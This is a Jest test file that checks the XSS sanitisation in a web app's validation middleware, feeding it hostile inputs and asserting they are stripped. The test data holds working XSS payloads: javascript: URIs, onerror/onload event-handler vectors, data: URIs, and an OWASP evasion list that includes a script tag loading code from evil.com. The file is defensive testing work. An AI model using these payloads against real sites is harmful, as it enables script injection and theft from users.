/**
 * XSS Sanitization Tests for middleware/validate.js
 *
 * Issue #4: Test XSS sanitization patterns that have 0% coverage
 * Lines 161-165 in validate.js contain critical security patterns:
 * - javascript: protocol stripping (line 161)
 * - data:script protocol stripping (line 162)
 * - Pattern detection for script tags and event handlers (line 164-165)
 *
 * These patterns provide fallback protection beyond DOMPurify.
 *
 * Test Strategy:
 * - Test through validation middleware using Joi schemas
 * - Cover all untested XSS protection branches
 */

const Joi = require('joi');

describe('XSS Sanitization - Issue #4', () => {
    let createValidationMiddleware;

    beforeEach(() => {
        // Clear module cache to get fresh middleware
        delete require.cache[require.resolve('../../middleware/validate')];
        const validate = require('../../middleware/validate');
        createValidationMiddleware = validate.createValidationMiddleware;
    });

    /**
     * Helper to test sanitization through the validation middleware
     */
    async function testSanitization(input) {
        return new Promise(resolve => {
            const schema = Joi.object().unknown(true);
            const middleware = createValidationMiddleware(schema, 'body');

            const req = {
                body: input,
                path: '/test',
                method: 'POST',
                id: 'test-' + Date.now(),
            };

            const res = {
                status: jest.fn(() => res),
                json: jest.fn(),
            };

            const next = jest.fn(() => {
                resolve({ success: true, data: req.body });
            });

            middleware(req, res, next);

            // If next wasn't called immediately, wait a tick
            setImmediate(() => {
                if (next.mock.calls.length > 0) {
                    resolve({ success: true, data: req.body });
                } else {
                    resolve({ success: false, response: res.json.mock.calls[0]?.[0] });
                }
            });
        });
    }

    describe('javascript: protocol stripping (line 161)', () => {
        test('should strip javascript: protocol from string', async () => {
            const result = await testSanitization({
                field: 'javascript:alert(1)',
            });

            expect(result.success).toBe(true);
            // After DOMPurify + our regex, javascript: should be removed
            if (result.data?.field) {
                expect(result.data.field.toLowerCase()).not.toContain('javascript:');
            }
        });

        test('should strip javascript: with mixed case', async () => {
            const result = await testSanitization({
                field: 'JaVaScRiPt:alert(1)',
            });

            expect(result.success).toBe(true);
            if (result.data?.field) {
                expect(result.data.field.toLowerCase()).not.toContain('javascript:');
            }
        });

        test('should handle javascript: in nested objects', async () => {
            const result = await testSanitization({
                nested: {
                    field: 'javascript:alert(1)',
                },
            });

            expect(result.success).toBe(true);
            if (result.data?.nested?.field) {
                expect(result.data.nested.field.toLowerCase()).not.toContain('javascript:');
            }
        });

        test('should handle javascript: in arrays', async () => {
            const result = await testSanitization({
                items: ['javascript:alert(1)', 'safe text', 'javascript:void(0)'],
            });

            expect(result.success).toBe(true);
            if (result.data?.items) {
                result.data.items.forEach(item => {
                    if (typeof item === 'string') {
                        expect(item.toLowerCase()).not.toContain('javascript:');
                    }
                });
            }
        });
    });

    describe('data:script protocol stripping (line 162)', () => {
        test('should strip data: protocol with script content', async () => {
            const result = await testSanitization({
                field: 'data:text/html,<script>alert(1)</script>',
            });

            expect(result.success).toBe(true);
            if (result.data?.field) {
                expect(result.data.field.toLowerCase()).not.toMatch(/data:.*script/i);
            }
        });

        test('should strip data:text/javascript URIs', async () => {
            const result = await testSanitization({
                field: 'data:text/javascript,alert(1)',
            });

            expect(result.success).toBe(true);
            if (result.data?.field) {
                expect(result.data.field.toLowerCase()).not.toMatch(/data:.*script/i);
            }
        });

        test('should handle data:script in nested structures', async () => {
            const result = await testSanitization({
                nested: {
                    deep: {
                        field: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
                    },
                },
            });

            expect(result.success).toBe(true);
        });
    });

    describe('Pattern detection and empty string return (lines 164-165)', () => {
        test('should detect <script tags and return empty string', async () => {
            const result = await testSanitization({
                field: '<script>alert(1)</script>',
            });

            expect(result.success).toBe(true);
            // Pattern should be detected and field should be empty or sanitized
            if (result.data?.field !== undefined) {
                const sanitized = result.data.field;
                // Either empty string or DOMPurify removed the script
                expect(sanitized).not.toMatch(/<script/i);
            }
        });

        test('should detect event handlers (onclick, onerror, etc)', async () => {
            const vectors = [
                '<img src=x onerror=alert(1)>',
                '<div onclick="alert(1)">',
                '<body onload="alert(1)">',
                '<svg onload=alert(1)>',
            ];

            for (const vector of vectors) {
                const result = await testSanitization({ field: vector });
                expect(result.success).toBe(true);

                if (result.data?.field !== undefined) {
                    const sanitized = result.data.field;
                    // Event handlers should be removed
                    expect(sanitized.toLowerCase()).not.toMatch(/on\w+\s*=/);
                }
            }
        });

        test('should detect javascript: in pattern match', async () => {
            // This tests the pattern match on line 164
            const result = await testSanitization({
                field: 'something with javascript: embedded',
            });

            expect(result.success).toBe(true);
        });

        test('should detect data:.*?script pattern', async () => {
            const result = await testSanitization({
                field: 'prefix data:text/html;script content',
            });

            expect(result.success).toBe(true);
        });
    });

    describe('Circular reference protection', () => {
        test('should handle circular references without crashing', async () => {
            const obj = { name: 'test' };
            obj.self = obj; // Circular reference

            // This should not crash - circular guard should prevent infinite recursion
            await expect(testSanitization(obj)).resolves.toBeDefined();
        });

        test('should handle deep circular references', async () => {
            const obj1 = { name: 'obj1' };
            const obj2 = { name: 'obj2', ref: obj1 };
            obj1.ref = obj2; // Circular reference between obj1 and obj2

            await expect(testSanitization(obj1)).resolves.toBeDefined();
        });
    });

    describe('Edge cases', () => {
        test('should handle empty strings', async () => {
            const result = await testSanitization({ field: '' });
            expect(result.success).toBe(true);
            expect(result.data.field).toBe('');
        });

        test('should handle null values', async () => {
            const result = await testSanitization({ field: null });
            expect(result.success).toBe(true);
            expect(result.data.field).toBeNull();
        });

        test('should handle undefined values', async () => {
            const result = await testSanitization({ field: undefined });
            expect(result.success).toBe(true);
        });

        test('should handle numbers (non-strings)', async () => {
            const result = await testSanitization({ count: 42 });
            expect(result.success).toBe(true);
            expect(result.data.count).toBe(42);
        });

        test('should handle booleans', async () => {
            const result = await testSanitization({ enabled: true });
            expect(result.success).toBe(true);
            expect(result.data.enabled).toBe(true);
        });

        test('should handle very long XSS payloads', async () => {
            const longPayload = '<script>' + 'A'.repeat(10000) + '</script>';
            const result = await testSanitization({ field: longPayload });
            expect(result.success).toBe(true);
        });

        test('should handle combined attack vectors', async () => {
            const result = await testSanitization({
                field: 'javascript:void(0);data:text/html,<script>alert(1)</script>',
            });

            expect(result.success).toBe(true);
            if (result.data?.field) {
                expect(result.data.field.toLowerCase()).not.toContain('javascript:');
                expect(result.data.field.toLowerCase()).not.toMatch(/data:.*script/i);
            }
        });

        test('should handle URL-encoded attack attempts', async () => {
            const result = await testSanitization({
                field: '%3Cscript%3Ealert(1)%3C/script%3E',
            });

            expect(result.success).toBe(true);
        });
    });

    describe('Legitimate content preservation', () => {
        test('should preserve safe text content', async () => {
            const safeInputs = [
                'This is normal text',
                'Email: user@example.com',
                'Price: $19.99',
                'Math: 2 + 2 = 4',
            ];

            for (const safe of safeInputs) {
                const result = await testSanitization({ description: safe });
                expect(result.success).toBe(true);
                // Safe content should be preserved (though whitespace/formatting may change)
                if (result.data?.description) {
                    expect(result.data.description).toBeTruthy();
                }
            }
        });

        test('should handle legitimate code snippets safely', async () => {
            const result = await testSanitization({
                code: 'const x = 5; // This is JavaScript code',
            });

            expect(result.success).toBe(true);
        });
    });

    describe('Integration with DOMPurify', () => {
        test('should work with DOMPurify as first line of defense', async () => {
            // DOMPurify removes dangerous HTML, our patterns are fallback
            const result = await testSanitization({
                field: '<iframe src="javascript:alert(1)"></iframe>',
            });

            expect(result.success).toBe(true);
            if (result.data?.field !== undefined) {
                expect(result.data.field).not.toMatch(/<iframe/i);
            }
        });

        test('should handle SVG-based XSS attempts', async () => {
            const result = await testSanitization({
                field: '<svg><script>alert(1)</script></svg>',
            });

            expect(result.success).toBe(true);
            if (result.data?.field !== undefined) {
                expect(result.data.field).not.toMatch(/<script/i);
            }
        });

        test('should handle malformed HTML tags', async () => {
            const result = await testSanitization({
                field: '<IMG """><SCRIPT>alert(1)</SCRIPT>">',
            });

            expect(result.success).toBe(true);
        });
    });

    describe('OWASP XSS Filter Evasion', () => {
        test('should block common OWASP evasion techniques', async () => {
            const owaspVectors = [
                '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>',
                '<ScRiPt>alert(1)</sCrIpT>',
                '<IMG SRC=`javascript:alert(1)`>',
                '<img src=x onerror=prompt(1)>',
                '<svg/onload=alert(1)>',
            ];

            for (const vector of owaspVectors) {
                const result = await testSanitization({ field: vector });
                expect(result.success).toBe(true);

                if (result.data?.field !== undefined) {
                    const sanitized = result.data.field.toLowerCase();
                    // Should not contain dangerous patterns
                    expect(sanitized).not.toMatch(/<script|javascript:|on\w+\s*=/);
                }
            }
        });
    });
});
